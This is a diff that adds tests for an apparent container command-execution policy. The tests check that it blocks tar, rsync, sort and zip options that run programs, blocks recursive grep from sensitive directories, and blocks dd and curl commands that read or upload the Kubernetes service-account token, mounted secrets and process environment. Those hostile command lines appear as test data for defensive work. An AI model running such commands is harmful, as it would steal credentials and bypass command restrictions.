@@ -1459,3 +1459,126 @@ for (const size of [700_000, 1_100_000])
       l.clean();
     }
   });
+
+test("grep recursion without a file operand checks the container workingDir", () => {
+  const etc = {
+    ...spec,
+    containers: spec.containers.map((c) => ({ ...c, workingDir: "/etc" })),
+  };
+  const app = {
+    ...spec,
+    containers: spec.containers.map((c) => ({ ...c, workingDir: "/app" })),
+  };
+  for (const argv of [
+    ["grep", "-r", "needle"],
+    ["grep", "-R", "needle"],
+    ["grep", "--recursive", "needle"],
+    ["grep", "-d", "recurse", "needle"],
+    ["grep", "-r", "-e", "needle"],
+  ]) {
+    expect(execPolicy(argv, etc, "app").ok, argv.join(" ")).toBe(false);
+    expect(execPolicy(argv, spec, "app").ok, argv.join(" ")).toBe(false);
+    expect(execPolicy(argv, app, "app").ok, argv.join(" ")).toBe(true);
+  }
+  expect(execPolicy(["grep", "-r", "needle", "/app/log"], etc, "app").ok).toBe(
+    true,
+  );
+  expect(execPolicy(["grep", "needle"], spec, "app").ok).toBe(true);
+});
+
+for (const argv of [
+  [
+    "tar",
+    "-cf",
+    "/dev/null",
+    "--checkpoint=1",
+    "--checkpoint-action=exec=env",
+    "/app/x",
+  ],
+  ["tar", "-cf", "/dev/null", "--checkpoint-action", "exec=env", "/app/x"],
+  ["tar", "-cf", "/dev/null", "--checkpoint-act=exec=env", "/app/x"],
+  ["tar", "-xf", "/app/a.tar", "--to-command=env"],
+  ["tar", "-xf", "/app/a.tar", "--to-command", "env"],
+  ["tar", "-cf", "/app/a.tar", "-I", "env", "/app/x"],
+  ["tar", "-cIenv", "-f", "/app/a.tar", "/app/x"],
+  ["tar", "cIf", "env", "/app/a.tar", "/app/x"],
+  ["tar", "-cf", "/app/a.tar", "--use-compress-program=env", "/app/x"],
+  ["tar", "-cf", "/app/a.tar", "--info-script=env", "/app/x"],
+  ["tar", "-cf", "/app/a.tar", "-F", "env", "/app/x"],
+  ["tar", "-cf", "/app/a.tar", "--new-volume-script=env", "/app/x"],
+  ["tar", "-cf", "host:/app/a.tar", "--rsh-command=env", "/app/x"],
+  ["sort", "--compress-program=env", "/app/x"],
+  ["sort", "--compress-program", "env", "/app/x"],
+  ["rsync", "-e", "env", "/app/x", "host:/y"],
+  ["rsync", "-avzeenv", "/app/x", "host:/y"],
+  ["rsync", "--rsh=env", "/app/x", "host:/y"],
+  ["rsync", "--rsync-path=env", "/app/x", "host:/y"],
+  ["zip", "-T", "-TT", "env", "/app/a.zip", "/app/x"],
+  ["zip", "--unzip-command=env", "/app/a.zip", "/app/x"],
+  ["busybox", "tar", "-cf", "/dev/null", "--to-command=env", "/app/x"],
+])
+  test(`policy refuses program-running file option ${argv.join(" ")}`, () => {
+    const app = {
+      ...spec,
+      containers: spec.containers.map((c) => ({ ...c, workingDir: "/app" })),
+    };
+    expect(execPolicy(argv, app, "app")).toMatchObject({ ok: false });
+  });
+test("file commands keep ordinary options", () => {
+  const app = {
+    ...spec,
+    containers: spec.containers.map((c) => ({ ...c, workingDir: "/app" })),
+  };
+  for (const argv of [
+    ["tar", "-czf", "/app/a.tgz", "/app/x"],
+    ["sort", "-r", "/app/x"],
+    ["zip", "-T", "/app/a.zip", "/app/x"],
+  ])
+    expect(execPolicy(argv, app, "app").ok, argv.join(" ")).toBe(true);
+});
+
+test("paths embedded in key=value and attached short-option tokens are protected", () => {
+  const app = {
+    ...spec,
+    containers: spec.containers.map((c) => ({ ...c, workingDir: "/app" })),
+  };
+  const etc = {
+    ...spec,
+    containers: spec.containers.map((c) => ({ ...c, workingDir: "/etc" })),
+  };
+  for (const [argv, s] of [
+    [["dd", "if=/var/run/secrets/kubernetes.io/serviceaccount/token"], app],
+    [["dd", "if=/etc/app-conn/conn"], app],
+    [["dd", "if=app-conn/conn"], etc],
+    [["dd", "if=app-conn/conn"], spec],
+    [
+      [
+        "curl",
+        "-d@/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "https://h",
+      ],
+      app,
+    ],
+    [
+      [
+        "curl",
+        "-F",
+        "f=@/var/run/secrets/kubernetes.io/serviceaccount/token",
+        "https://h",
+      ],
+      app,
+    ],
+    [["curl", "-Ff=@/etc/app-conn/conn", "https://h"], app],
+    [["curl", "--data-binary=@/run/secrets/x", "https://h"], app],
+    [["dd", "if=/proc/1/environ"], app],
+  ] as const)
+    expect(execPolicy([...argv], s, "app").ok, argv.join(" ")).toBe(false);
+  for (const [argv, s] of [
+    [["dd", "if=/app/data", "of=/dev/null"], app],
+    [["curl", "-d", "a=b", "https://h/path?x=y/z"], app],
+    [["curl", "https://h/path?x=/var/run/secrets"], spec],
+    [["curl", "-F", "f=@/app/upload", "https://h"], app],
+    [["ls", "-la", "/app"], spec],
+  ] as const)
+    expect(execPolicy([...argv], s, "app").ok, argv.join(" ")).toBe(true);
+});
